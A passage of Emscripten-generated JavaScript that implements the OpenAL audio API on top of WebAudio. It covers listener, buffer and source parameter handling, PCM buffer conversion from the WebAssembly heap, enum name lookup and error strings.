                    case 49152:
                        if (!Number.isFinite(value) || value < 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        AL.currentCtx.dopplerFactor = value;
                        AL.updateListenerSpace(AL.currentCtx);
                        break;
                    case 49155:
                        if (!Number.isFinite(value) || value <= 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        AL.currentCtx.speedOfSound = value;
                        AL.updateListenerSpace(AL.currentCtx);
                        break;
                    case 53248:
                        switch (value) {
                            case 0:
                            case 53249:
                            case 53250:
                            case 53251:
                            case 53252:
                            case 53253:
                            case 53254:
                                AL.currentCtx.distanceModel = value;
                                AL.updateContextGlobal(AL.currentCtx);
                                break;
                            default:
                                AL.currentCtx.err = 40963;
                                return
                        }
                        break;
                    default:
                        AL.currentCtx.err = 40962;
                        return
                }
            }
            ,
            getListenerParam: (funcname, param) => {
                if (!AL.currentCtx) {
                    return null
                }
                switch (param) {
                    case 4100:
                        return AL.currentCtx.listener.position;
                    case 4102:
                        return AL.currentCtx.listener.velocity;
                    case 4111:
                        return AL.currentCtx.listener.direction.concat(AL.currentCtx.listener.up);
                    case 4106:
                        return AL.currentCtx.gain.gain.value;
                    default:
                        AL.currentCtx.err = 40962;
                        return null
                }
            }
            ,
            setListenerParam: (funcname, param, value) => {
                if (!AL.currentCtx) {
                    return
                }
                if (value === null) {
                    AL.currentCtx.err = 40962;
                    return
                }
                var listener = AL.currentCtx.listener;
                switch (param) {
                    case 4100:
                        if (!Number.isFinite(value[0]) || !Number.isFinite(value[1]) || !Number.isFinite(value[2])) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        listener.position[0] = value[0];
                        listener.position[1] = value[1];
                        listener.position[2] = value[2];
                        AL.updateListenerSpace(AL.currentCtx);
                        break;
                    case 4102:
                        if (!Number.isFinite(value[0]) || !Number.isFinite(value[1]) || !Number.isFinite(value[2])) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        listener.velocity[0] = value[0];
                        listener.velocity[1] = value[1];
                        listener.velocity[2] = value[2];
                        AL.updateListenerSpace(AL.currentCtx);
                        break;
                    case 4106:
                        if (!Number.isFinite(value) || value < 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        AL.currentCtx.gain.gain.value = value;
                        break;
                    case 4111:
                        if (!Number.isFinite(value[0]) || !Number.isFinite(value[1]) || !Number.isFinite(value[2]) || !Number.isFinite(value[3]) || !Number.isFinite(value[4]) || !Number.isFinite(value[5])) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        listener.direction[0] = value[0];
                        listener.direction[1] = value[1];
                        listener.direction[2] = value[2];
                        listener.up[0] = value[3];
                        listener.up[1] = value[4];
                        listener.up[2] = value[5];
                        AL.updateListenerSpace(AL.currentCtx);
                        break;
                    default:
                        AL.currentCtx.err = 40962;
                        return
                }
            }
            ,
            getBufferParam: (funcname, bufferId, param) => {
                if (!AL.currentCtx) {
                    return
                }
                var buf = AL.buffers[bufferId];
                if (!buf || bufferId === 0) {
                    AL.currentCtx.err = 40961;
                    return
                }
                switch (param) {
                    case 8193:
                        return buf.frequency;
                    case 8194:
                        return buf.bytesPerSample * 8;
                    case 8195:
                        return buf.channels;
                    case 8196:
                        return buf.length * buf.bytesPerSample * buf.channels;
                    case 8213:
                        if (buf.length === 0) {
                            return [0, 0]
                        }
                        return [(buf.audioBuf._loopStart || 0) * buf.frequency, (buf.audioBuf._loopEnd || buf.length) * buf.frequency];
                    default:
                        AL.currentCtx.err = 40962;
                        return null
                }
            }
            ,
            setBufferParam: (funcname, bufferId, param, value) => {
                if (!AL.currentCtx) {
                    return
                }
                var buf = AL.buffers[bufferId];
                if (!buf || bufferId === 0) {
                    AL.currentCtx.err = 40961;
                    return
                }
                if (value === null) {
                    AL.currentCtx.err = 40962;
                    return
                }
                switch (param) {
                    case 8196:
                        if (value !== 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        break;
                    case 8213:
                        if (value[0] < 0 || value[0] > buf.length || value[1] < 0 || value[1] > buf.Length || value[0] >= value[1]) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        if (buf.refCount > 0) {
                            AL.currentCtx.err = 40964;
                            return
                        }
                        if (buf.audioBuf) {
                            buf.audioBuf._loopStart = value[0] / buf.frequency;
                            buf.audioBuf._loopEnd = value[1] / buf.frequency
                        }
                        break;
                    default:
                        AL.currentCtx.err = 40962;
                        return
                }
            }
            ,
            getSourceParam: (funcname, sourceId, param) => {
                if (!AL.currentCtx) {
                    return null
                }
                var src = AL.currentCtx.sources[sourceId];
                if (!src) {
                    AL.currentCtx.err = 40961;
                    return null
                }
                switch (param) {
                    case 514:
                        return src.relative;
                    case 4097:
                        return src.coneInnerAngle;
                    case 4098:
                        return src.coneOuterAngle;
                    case 4099:
                        return src.pitch;
                    case 4100:
                        return src.position;
                    case 4101:
                        return src.direction;
                    case 4102:
                        return src.velocity;
                    case 4103:
                        return src.looping;
                    case 4105:
                        if (src.type === 4136) {
                            return src.bufQueue[0].id
                        }
                        return 0;
                    case 4106:
                        return src.gain.gain.value;
                    case 4109:
                        return src.minGain;
                    case 4110:
                        return src.maxGain;
                    case 4112:
                        return src.state;
                    case 4117:
                        if (src.bufQueue.length === 1 && src.bufQueue[0].id === 0) {
                            return 0
                        }
                        return src.bufQueue.length;
                    case 4118:
                        if (src.bufQueue.length === 1 && src.bufQueue[0].id === 0 || src.looping) {
                            return 0
                        }
                        return src.bufsProcessed;
                    case 4128:
                        return src.refDistance;
                    case 4129:
                        return src.rolloffFactor;
                    case 4130:
                        return src.coneOuterGain;
                    case 4131:
                        return src.maxDistance;
                    case 4132:
                        return AL.sourceTell(src);
                    case 4133:
                        var offset = AL.sourceTell(src);
                        if (offset > 0) {
                            offset *= src.bufQueue[0].frequency
                        }
                        return offset;
                    case 4134:
                        var offset = AL.sourceTell(src);
                        if (offset > 0) {
                            offset *= src.bufQueue[0].frequency * src.bufQueue[0].bytesPerSample
                        }
                        return offset;
                    case 4135:
                        return src.type;
                    case 4628:
                        return src.spatialize;
                    case 8201:
                        var length = 0;
                        var bytesPerFrame = 0;
                        for (var i = 0; i < src.bufQueue.length; i++) {
                            length += src.bufQueue[i].length;
                            if (src.bufQueue[i].id !== 0) {
                                bytesPerFrame = src.bufQueue[i].bytesPerSample * src.bufQueue[i].channels
                            }
                        }
                        return length * bytesPerFrame;
                    case 8202:
                        var length = 0;
                        for (var i = 0; i < src.bufQueue.length; i++) {
                            length += src.bufQueue[i].length
                        }
                        return length;
                    case 8203:
                        return AL.sourceDuration(src);
                    case 53248:
                        return src.distanceModel;
                    default:
                        AL.currentCtx.err = 40962;
                        return null
                }
            }
            ,
            setSourceParam: (funcname, sourceId, param, value) => {
                if (!AL.currentCtx) {
                    return
                }
                var src = AL.currentCtx.sources[sourceId];
                if (!src) {
                    AL.currentCtx.err = 40961;
                    return
                }
                if (value === null) {
                    AL.currentCtx.err = 40962;
                    return
                }
                switch (param) {
                    case 514:
                        if (value === 1) {
                            src.relative = true;
                            AL.updateSourceSpace(src)
                        } else if (value === 0) {
                            src.relative = false;
                            AL.updateSourceSpace(src)
                        } else {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        break;
                    case 4097:
                        if (!Number.isFinite(value)) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.coneInnerAngle = value;
                        if (src.panner) {
                            src.panner.coneInnerAngle = value % 360
                        }
                        break;
                    case 4098:
                        if (!Number.isFinite(value)) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.coneOuterAngle = value;
                        if (src.panner) {
                            src.panner.coneOuterAngle = value % 360
                        }
                        break;
                    case 4099:
                        if (!Number.isFinite(value) || value <= 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        if (src.pitch === value) {
                            break
                        }
                        src.pitch = value;
                        AL.updateSourceRate(src);
                        break;
                    case 4100:
                        if (!Number.isFinite(value[0]) || !Number.isFinite(value[1]) || !Number.isFinite(value[2])) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.position[0] = value[0];
                        src.position[1] = value[1];
                        src.position[2] = value[2];
                        AL.updateSourceSpace(src);
                        break;
                    case 4101:
                        if (!Number.isFinite(value[0]) || !Number.isFinite(value[1]) || !Number.isFinite(value[2])) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.direction[0] = value[0];
                        src.direction[1] = value[1];
                        src.direction[2] = value[2];
                        AL.updateSourceSpace(src);
                        break;
                    case 4102:
                        if (!Number.isFinite(value[0]) || !Number.isFinite(value[1]) || !Number.isFinite(value[2])) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.velocity[0] = value[0];
                        src.velocity[1] = value[1];
                        src.velocity[2] = value[2];
                        AL.updateSourceSpace(src);
                        break;
                    case 4103:
                        if (value === 1) {
                            src.looping = true;
                            AL.updateSourceTime(src);
                            if (src.type === 4136 && src.audioQueue.length > 0) {
                                var audioSrc = src.audioQueue[0];
                                audioSrc.loop = true;
                                audioSrc._duration = Number.POSITIVE_INFINITY
                            }
                        } else if (value === 0) {
                            src.looping = false;
                            var currentTime = AL.updateSourceTime(src);
                            if (src.type === 4136 && src.audioQueue.length > 0) {
                                var audioSrc = src.audioQueue[0];
                                audioSrc.loop = false;
                                audioSrc._duration = src.bufQueue[0].audioBuf.duration / src.playbackRate;
                                audioSrc._startTime = currentTime - src.bufOffset / src.playbackRate
                            }
                        } else {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        break;
                    case 4105:
                        if (src.state === 4114 || src.state === 4115) {
                            AL.currentCtx.err = 40964;
                            return
                        }
                        if (value === 0) {
                            for (var i in src.bufQueue) {
                                src.bufQueue[i].refCount--
                            }
                            src.bufQueue.length = 1;
                            src.bufQueue[0] = AL.buffers[0];
                            src.bufsProcessed = 0;
                            src.type = 4144
                        } else {
                            var buf = AL.buffers[value];
                            if (!buf) {
                                AL.currentCtx.err = 40963;
                                return
                            }
                            for (var i in src.bufQueue) {
                                src.bufQueue[i].refCount--
                            }
                            src.bufQueue.length = 0;
                            buf.refCount++;
                            src.bufQueue = [buf];
                            src.bufsProcessed = 0;
                            src.type = 4136
                        }
                        AL.initSourcePanner(src);
                        AL.scheduleSourceAudio(src);
                        break;
                    case 4106:
                        if (!Number.isFinite(value) || value < 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.gain.gain.value = value;
                        break;
                    case 4109:
                        if (!Number.isFinite(value) || value < 0 || value > Math.min(src.maxGain, 1)) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.minGain = value;
                        break;
                    case 4110:
                        if (!Number.isFinite(value) || value < Math.max(0, src.minGain) || value > 1) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.maxGain = value;
                        break;
                    case 4128:
                        if (!Number.isFinite(value) || value < 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.refDistance = value;
                        if (src.panner) {
                            src.panner.refDistance = value
                        }
                        break;
                    case 4129:
                        if (!Number.isFinite(value) || value < 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.rolloffFactor = value;
                        if (src.panner) {
                            src.panner.rolloffFactor = value
                        }
                        break;
                    case 4130:
                        if (!Number.isFinite(value) || value < 0 || value > 1) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.coneOuterGain = value;
                        if (src.panner) {
                            src.panner.coneOuterGain = value
                        }
                        break;
                    case 4131:
                        if (!Number.isFinite(value) || value < 0) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.maxDistance = value;
                        if (src.panner) {
                            src.panner.maxDistance = value
                        }
                        break;
                    case 4132:
                        if (value < 0 || value > AL.sourceDuration(src)) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        AL.sourceSeek(src, value);
                        break;
                    case 4133:
                        var srcLen = AL.sourceDuration(src);
                        if (srcLen > 0) {
                            var frequency;
                            for (var bufId in src.bufQueue) {
                                if (bufId) {
                                    frequency = src.bufQueue[bufId].frequency;
                                    break
                                }
                            }
                            value /= frequency
                        }
                        if (value < 0 || value > srcLen) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        AL.sourceSeek(src, value);
                        break;
                    case 4134:
                        var srcLen = AL.sourceDuration(src);
                        if (srcLen > 0) {
                            var bytesPerSec;
                            for (var bufId in src.bufQueue) {
                                if (bufId) {
                                    var buf = src.bufQueue[bufId];
                                    bytesPerSec = buf.frequency * buf.bytesPerSample * buf.channels;
                                    break
                                }
                            }
                            value /= bytesPerSec
                        }
                        if (value < 0 || value > srcLen) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        AL.sourceSeek(src, value);
                        break;
                    case 4628:
                        if (value !== 0 && value !== 1 && value !== 2) {
                            AL.currentCtx.err = 40963;
                            return
                        }
                        src.spatialize = value;
                        AL.initSourcePanner(src);
                        break;
                    case 8201:
                    case 8202:
                    case 8203:
                        AL.currentCtx.err = 40964;
                        break;
                    case 53248:
                        switch (value) {
                            case 0:
                            case 53249:
                            case 53250:
                            case 53251:
                            case 53252:
                            case 53253:
                            case 53254:
                                src.distanceModel = value;
                                if (AL.currentCtx.sourceDistanceModel) {
                                    AL.updateContextGlobal(AL.currentCtx)
                                }
                                break;
                            default:
                                AL.currentCtx.err = 40963;
                                return
                        }
                        break;
                    default:
                        AL.currentCtx.err = 40962;
                        return
                }
            }
            ,
            captures: {},
            sharedCaptureAudioCtx: null,
            requireValidCaptureDevice: (deviceId, funcname) => {
                if (deviceId === 0) {
                    AL.alcErr = 40961;
                    return null
                }
                var c = AL.captures[deviceId];
                if (!c) {
                    AL.alcErr = 40961;
                    return null
                }
                var err = c.mediaStreamError;
                if (err) {
                    AL.alcErr = 40961;
                    return null
                }
                return c
            }
        };
        var _alBufferData = (bufferId, format, pData, size, freq) => {
            if (!AL.currentCtx) {
                return
            }
            var buf = AL.buffers[bufferId];
            if (!buf) {
                AL.currentCtx.err = 40963;
                return
            }
            if (freq <= 0) {
                AL.currentCtx.err = 40963;
                return
            }
            var audioBuf = null;
            try {
                switch (format) {
                    case 4352:
                        if (size > 0) {
                            audioBuf = AL.currentCtx.audioCtx.createBuffer(1, size, freq);
                            var channel0 = audioBuf.getChannelData(0);
                            for (var i = 0; i < size; ++i) {
                                channel0[i] = HEAPU8[pData++] * .0078125 - 1
                            }
                        }
                        buf.bytesPerSample = 1;
                        buf.channels = 1;
                        buf.length = size;
                        break;
                    case 4353:
                        if (size > 0) {
                            audioBuf = AL.currentCtx.audioCtx.createBuffer(1, size >> 1, freq);
                            var channel0 = audioBuf.getChannelData(0);
                            pData >>= 1;
                            for (var i = 0; i < size >> 1; ++i) {
                                channel0[i] = HEAP16[pData++] * 30517578125e-15
                            }
                        }
                        buf.bytesPerSample = 2;
                        buf.channels = 1;
                        buf.length = size >> 1;
                        break;
                    case 4354:
                        if (size > 0) {
                            audioBuf = AL.currentCtx.audioCtx.createBuffer(2, size >> 1, freq);
                            var channel0 = audioBuf.getChannelData(0);
                            var channel1 = audioBuf.getChannelData(1);
                            for (var i = 0; i < size >> 1; ++i) {
                                channel0[i] = HEAPU8[pData++] * .0078125 - 1;
                                channel1[i] = HEAPU8[pData++] * .0078125 - 1
                            }
                        }
                        buf.bytesPerSample = 1;
                        buf.channels = 2;
                        buf.length = size >> 1;
                        break;
                    case 4355:
                        if (size > 0) {
                            audioBuf = AL.currentCtx.audioCtx.createBuffer(2, size >> 2, freq);
                            var channel0 = audioBuf.getChannelData(0);
                            var channel1 = audioBuf.getChannelData(1);
                            pData >>= 1;
                            for (var i = 0; i < size >> 2; ++i) {
                                channel0[i] = HEAP16[pData++] * 30517578125e-15;
                                channel1[i] = HEAP16[pData++] * 30517578125e-15
                            }
                        }
                        buf.bytesPerSample = 2;
                        buf.channels = 2;
                        buf.length = size >> 2;
                        break;
                    case 65552:
                        if (size > 0) {
                            audioBuf = AL.currentCtx.audioCtx.createBuffer(1, size >> 2, freq);
                            var channel0 = audioBuf.getChannelData(0);
                            pData >>= 2;
                            for (var i = 0; i < size >> 2; ++i) {
                                channel0[i] = HEAPF32[pData++]
                            }
                        }
                        buf.bytesPerSample = 4;
                        buf.channels = 1;
                        buf.length = size >> 2;
                        break;
                    case 65553:
                        if (size > 0) {
                            audioBuf = AL.currentCtx.audioCtx.createBuffer(2, size >> 3, freq);
                            var channel0 = audioBuf.getChannelData(0);
                            var channel1 = audioBuf.getChannelData(1);
                            pData >>= 2;
                            for (var i = 0; i < size >> 3; ++i) {
                                channel0[i] = HEAPF32[pData++];
                                channel1[i] = HEAPF32[pData++]
                            }
                        }
                        buf.bytesPerSample = 4;
                        buf.channels = 2;
                        buf.length = size >> 3;
                        break;
                    default:
                        AL.currentCtx.err = 40963;
                        return
                }
                buf.frequency = freq;
                buf.audioBuf = audioBuf
            } catch (e) {
                AL.currentCtx.err = 40963;
                return
            }
        }
            ;
        var _alBufferiv = (bufferId, param, pValues) => {
            if (!AL.currentCtx) {
                return
            }
            if (!pValues) {
                AL.currentCtx.err = 40963;
                return
            }
            switch (param) {
                case 8213:
                    AL.paramArray[0] = HEAP32[pValues >> 2];
                    AL.paramArray[1] = HEAP32[pValues + 4 >> 2];
                    AL.setBufferParam("alBufferiv", bufferId, param, AL.paramArray);
                    break;
                default:
                    AL.setBufferParam("alBufferiv", bufferId, param, null);
                    break
            }
        }
            ;
        var _alDeleteBuffers = (count, pBufferIds) => {
            if (!AL.currentCtx) {
                return
            }
            for (var i = 0; i < count; ++i) {
                var bufId = HEAP32[pBufferIds + i * 4 >> 2];
                if (bufId === 0) {
                    continue
                }
                if (!AL.buffers[bufId]) {
                    AL.currentCtx.err = 40961;
                    return
                }
                if (AL.buffers[bufId].refCount) {
                    AL.currentCtx.err = 40964;
                    return
                }
            }
            for (var i = 0; i < count; ++i) {
                var bufId = HEAP32[pBufferIds + i * 4 >> 2];
                if (bufId === 0) {
                    continue
                }
                AL.deviceRefCounts[AL.buffers[bufId].deviceId]--;
                delete AL.buffers[bufId];
                AL.freeIds.push(bufId)
            }
        }
            ;
        var _alSourcei = (sourceId, param, value) => {
            switch (param) {
                case 514:
                case 4097:
                case 4098:
                case 4103:
                case 4105:
                case 4128:
                case 4129:
                case 4131:
                case 4132:
                case 4133:
                case 4134:
                case 4628:
                case 8201:
                case 8202:
                case 53248:
                    AL.setSourceParam("alSourcei", sourceId, param, value);
                    break;
                default:
                    AL.setSourceParam("alSourcei", sourceId, param, null);
                    break
            }
        }
            ;
        var _alDeleteSources = (count, pSourceIds) => {
            if (!AL.currentCtx) {
                return
            }
            for (var i = 0; i < count; ++i) {
                var srcId = HEAP32[pSourceIds + i * 4 >> 2];
                if (!AL.currentCtx.sources[srcId]) {
                    AL.currentCtx.err = 40961;
                    return
                }
            }
            for (var i = 0; i < count; ++i) {
                var srcId = HEAP32[pSourceIds + i * 4 >> 2];
                AL.setSourceState(AL.currentCtx.sources[srcId], 4116);
                _alSourcei(srcId, 4105, 0);
                delete AL.currentCtx.sources[srcId];
                AL.freeIds.push(srcId)
            }
        }
            ;
        var _alDistanceModel = model => {
            AL.setGlobalParam("alDistanceModel", 53248, model)
        }
            ;
        var _alGenBuffers = (count, pBufferIds) => {
            if (!AL.currentCtx) {
                return
            }
            for (var i = 0; i < count; ++i) {
                var buf = {
                    deviceId: AL.currentCtx.deviceId,
                    id: AL.newId(),
                    refCount: 0,
                    audioBuf: null,
                    frequency: 0,
                    bytesPerSample: 2,
                    channels: 1,
                    length: 0
                };
                AL.deviceRefCounts[buf.deviceId]++;
                AL.buffers[buf.id] = buf;
                HEAP32[pBufferIds + i * 4 >> 2] = buf.id
            }
        }
            ;
        var _alGenSources = (count, pSourceIds) => {
            if (!AL.currentCtx) {
                return
            }
            for (var i = 0; i < count; ++i) {
                var gain = AL.currentCtx.audioCtx.createGain();
                gain.connect(AL.currentCtx.gain);
                var src = {
                    context: AL.currentCtx,
                    id: AL.newId(),
                    type: 4144,
                    state: 4113,
                    bufQueue: [AL.buffers[0]],
                    audioQueue: [],
                    looping: false,
                    pitch: 1,
                    dopplerShift: 1,
                    gain,
                    minGain: 0,
                    maxGain: 1,
                    panner: null,
                    bufsProcessed: 0,
                    bufStartTime: Number.NEGATIVE_INFINITY,
                    bufOffset: 0,
                    relative: false,
                    refDistance: 1,
                    maxDistance: 340282e33,
                    rolloffFactor: 1,
                    position: [0, 0, 0],
                    velocity: [0, 0, 0],
                    direction: [0, 0, 0],
                    coneOuterGain: 0,
                    coneInnerAngle: 360,
                    coneOuterAngle: 360,
                    distanceModel: 53250,
                    spatialize: 2,
                    get playbackRate() {
                        return this.pitch * this.dopplerShift
                    }
                };
                AL.currentCtx.sources[src.id] = src;
                HEAP32[pSourceIds + i * 4 >> 2] = src.id
            }
        }
            ;
        var _alGetEnumValue = pEnumName => {
            if (!AL.currentCtx) {
                return 0
            }
            if (!pEnumName) {
                AL.currentCtx.err = 40963;
                return 0
            }
            var name = UTF8ToString(pEnumName);
            switch (name) {
                case "AL_BITS":
                    return 8194;
                case "AL_BUFFER":
                    return 4105;
                case "AL_BUFFERS_PROCESSED":
                    return 4118;
                case "AL_BUFFERS_QUEUED":
                    return 4117;
                case "AL_BYTE_OFFSET":
                    return 4134;
                case "AL_CHANNELS":
                    return 8195;
                case "AL_CONE_INNER_ANGLE":
                    return 4097;
                case "AL_CONE_OUTER_ANGLE":
                    return 4098;
                case "AL_CONE_OUTER_GAIN":
                    return 4130;
                case "AL_DIRECTION":
                    return 4101;
                case "AL_DISTANCE_MODEL":
                    return 53248;
                case "AL_DOPPLER_FACTOR":
                    return 49152;
                case "AL_DOPPLER_VELOCITY":
                    return 49153;
                case "AL_EXPONENT_DISTANCE":
                    return 53253;
                case "AL_EXPONENT_DISTANCE_CLAMPED":
                    return 53254;
                case "AL_EXTENSIONS":
                    return 45060;
                case "AL_FORMAT_MONO16":
                    return 4353;
                case "AL_FORMAT_MONO8":
                    return 4352;
                case "AL_FORMAT_STEREO16":
                    return 4355;
                case "AL_FORMAT_STEREO8":
                    return 4354;
                case "AL_FREQUENCY":
                    return 8193;
                case "AL_GAIN":
                    return 4106;
                case "AL_INITIAL":
                    return 4113;
                case "AL_INVALID":
                    return -1;
                case "AL_ILLEGAL_ENUM":
                case "AL_INVALID_ENUM":
                    return 40962;
                case "AL_INVALID_NAME":
                    return 40961;
                case "AL_ILLEGAL_COMMAND":
                case "AL_INVALID_OPERATION":
                    return 40964;
                case "AL_INVALID_VALUE":
                    return 40963;
                case "AL_INVERSE_DISTANCE":
                    return 53249;
                case "AL_INVERSE_DISTANCE_CLAMPED":
                    return 53250;
                case "AL_LINEAR_DISTANCE":
                    return 53251;
                case "AL_LINEAR_DISTANCE_CLAMPED":
                    return 53252;
                case "AL_LOOPING":
                    return 4103;
                case "AL_MAX_DISTANCE":
                    return 4131;
                case "AL_MAX_GAIN":
                    return 4110;
                case "AL_MIN_GAIN":
                    return 4109;
                case "AL_NONE":
                    return 0;
                case "AL_NO_ERROR":
                    return 0;
                case "AL_ORIENTATION":
                    return 4111;
                case "AL_OUT_OF_MEMORY":
                    return 40965;
                case "AL_PAUSED":
                    return 4115;
                case "AL_PENDING":
                    return 8209;
                case "AL_PITCH":
                    return 4099;
                case "AL_PLAYING":
                    return 4114;
                case "AL_POSITION":
                    return 4100;
                case "AL_PROCESSED":
                    return 8210;
                case "AL_REFERENCE_DISTANCE":
                    return 4128;
                case "AL_RENDERER":
                    return 45059;
                case "AL_ROLLOFF_FACTOR":
                    return 4129;
                case "AL_SAMPLE_OFFSET":
                    return 4133;
                case "AL_SEC_OFFSET":
                    return 4132;
                case "AL_SIZE":
                    return 8196;
                case "AL_SOURCE_RELATIVE":
                    return 514;
                case "AL_SOURCE_STATE":
                    return 4112;
                case "AL_SOURCE_TYPE":
                    return 4135;
                case "AL_SPEED_OF_SOUND":
                    return 49155;
                case "AL_STATIC":
                    return 4136;
                case "AL_STOPPED":
                    return 4116;
                case "AL_STREAMING":
                    return 4137;
                case "AL_UNDETERMINED":
                    return 4144;
                case "AL_UNUSED":
                    return 8208;
                case "AL_VELOCITY":
                    return 4102;
                case "AL_VENDOR":
                    return 45057;
                case "AL_VERSION":
                    return 45058;
                case "AL_AUTO_SOFT":
                    return 2;
                case "AL_SOURCE_DISTANCE_MODEL":
                    return 512;
                case "AL_SOURCE_SPATIALIZE_SOFT":
                    return 4628;
                case "AL_LOOP_POINTS_SOFT":
                    return 8213;
                case "AL_BYTE_LENGTH_SOFT":
                    return 8201;
                case "AL_SAMPLE_LENGTH_SOFT":
                    return 8202;
                case "AL_SEC_LENGTH_SOFT":
                    return 8203;
                case "AL_FORMAT_MONO_FLOAT32":
                    return 65552;
                case "AL_FORMAT_STEREO_FLOAT32":
                    return 65553;
                default:
                    AL.currentCtx.err = 40963;
                    return 0
            }
        }
            ;
        var _alGetError = () => {
            if (!AL.currentCtx) {
                return 40964
            }
            var err = AL.currentCtx.err;
            AL.currentCtx.err = 0;
            return err
        }
            ;
        var _alGetSourcef = (sourceId, param, pValue) => {
            var val = AL.getSourceParam("alGetSourcef", sourceId, param);
            if (val === null) {
                return
            }
            if (!pValue) {
                AL.currentCtx.err = 40963;
                return
            }
            switch (param) {
                case 4097:
                case 4098:
                case 4099:
                case 4106:
                case 4109:
                case 4110:
                case 4128:
                case 4129:
                case 4130:
                case 4131:
                case 4132:
                case 4133:
                case 4134:
                case 8203:
                    HEAPF32[pValue >> 2] = val;
                    break;
                default:
                    AL.currentCtx.err = 40962;
                    return
            }
        }
            ;
        var _alGetSourcei = (sourceId, param, pValue) => {
            var val = AL.getSourceParam("alGetSourcei", sourceId, param);
            if (val === null) {
                return
            }
            if (!pValue) {
                AL.currentCtx.err = 40963;
                return
            }
            switch (param) {
                case 514:
                case 4097:
                case 4098:
                case 4103:
                case 4105:
                case 4112:
                case 4117:
                case 4118:
                case 4128:
                case 4129:
                case 4131:
                case 4132:
                case 4133:
                case 4134:
                case 4135:
                case 4628:
                case 8201:
                case 8202:
                case 53248:
                    HEAP32[pValue >> 2] = val;
                    break;
                default:
                    AL.currentCtx.err = 40962;
                    return
            }
        }
            ;
        var stringToNewUTF8 = str => {
            var size = lengthBytesUTF8(str) + 1;
            var ret = _malloc(size);
            if (ret)
                stringToUTF8(str, ret, size);
            return ret
        }
            ;
        var _alGetString = param => {
            if (AL.stringCache[param]) {
                return AL.stringCache[param]
            }
            var ret;
            switch (param) {
                case 0:
                    ret = "No Error";
                    break;
                case 40961:
                    ret = "Invalid Name";
                    break;
                case 40962:
                    ret = "Invalid Enum";
                    break;
                case 40963:
                    ret = "Invalid Value";
                    break;
                case 40964:
                    ret = "Invalid Operation";
                    break;
                case 40965:
                    ret = "Out of Memory";
                    break;
                case 45057:
                    ret = "Emscripten";
                    break;
                case 45058:
                    ret = "1.1";
                    break;
                case 45059:
                    ret = "WebAudio";
                    break;
                case 45060:
                    ret = Object.keys(AL.AL_EXTENSIONS).join(" ");
                    break;
                default:
                    if (AL.currentCtx) {
                        AL.currentCtx.err = 40962
                    } else { }
                    return 0
            }
            ret = stringToNewUTF8(ret);
            AL.stringCache[param] = ret;
            return ret
        }
            ;
        var _alIsBuffer = bufferId => {
            if (!AL.currentCtx) {
                return false
            }
            if (bufferId > AL.buffers.length) {
                return false
            }
            if (!AL.buffers[bufferId]) {
                return false
            }
            return true
        }
            ;
        var _alIsExtensionPresent = pExtName => {
            var name = UTF8ToString(pExtName);
            return AL.AL_EXTENSIONS[name] ? 1 : 0
        }
            ;
        var _alListener3f = (param, value0, value1, value2) => {
            switch (param) {
                case 4100:
                case 4102:
                    AL.paramArray[0] = value0;
                    AL.paramArray[1] = value1;
                    AL.paramArray[2] = value2;
                    AL.setListenerParam("alListener3f", param, AL.paramArray);
                    break;
                default:
                    AL.setListenerParam("alListener3f", param, null);
                    break
            }
        }
            ;
        var _alListenerf = (param, value) => {
            switch (param) {
                case 4106:
                    AL.setListenerParam("alListenerf", param, value);
                    break;
                default:
                    AL.setListenerParam("alListenerf", param, null);
                    break
            }
        }
            ;
        var _alListenerfv = (param, pValues) => {
            if (!AL.currentCtx) {
                return
            }
            if (!pValues) {
                AL.currentCtx.err = 40963;
                return
            }
            switch (param) {
                case 4100:
                case 4102:
                    AL.paramArray[0] = HEAPF32[pValues >> 2];
                    AL.paramArray[1] = HEAPF32[pValues + 4 >> 2];
                    AL.paramArray[2] = HEAPF32[pValues + 8 >> 2];
                    AL.setListenerParam("alListenerfv", param, AL.paramArray);
                    break;
                case 4111:
                    AL.paramArray[0] = HEAPF32[pValues >> 2];
                    AL.paramArray[1] = HEAPF32[pValues + 4 >> 2];
                    AL.paramArray[2] = HEAPF32[pValues + 8 >> 2];
                    AL.paramArray[3] = HEAPF32[pValues + 12 >> 2];
                    AL.paramArray[4] = HEAPF32[pValues + 16 >> 2];
                    AL.paramArray[5] = HEAPF32[pValues + 20 >> 2];
                    AL.setListenerParam("alListenerfv", param, AL.paramArray);
                    break;
                default:
                    AL.setListenerParam("alListenerfv", param, null);
                    break
            }
        }
            ;
        var _alSource3f = (sourceId, param, value0, value1, value2) => {
            switch (param) {
                case 4100:
                case 4101:
                case 4102:
                    AL.paramArray[0] = value0;
                    AL.paramArray[1] = value1;
                    AL.paramArray[2] = value2;
                    AL.setSourceParam("alSource3f", sourceId, param, AL.paramArray);
                    break;
                default:
                    AL.setSourceParam("alSource3f", sourceId, param, null);
                    break
            }
        }
            ;
        var _alSource3i = (sourceId, param, value0, value1, value2) => {
            switch (param) {
                case 4100:
                case 4101:
                case 4102:
                    AL.paramArray[0] = value0;
                    AL.paramArray[1] = value1;
                    AL.paramArray[2] = value2;
                    AL.setSourceParam("alSource3i", sourceId, param, AL.paramArray);
                    break;
                default:
                    AL.setSourceParam("alSource3i", sourceId, param, null);
                    break
            }
        }
            ;
        var _alSourcePause = sourceId => {
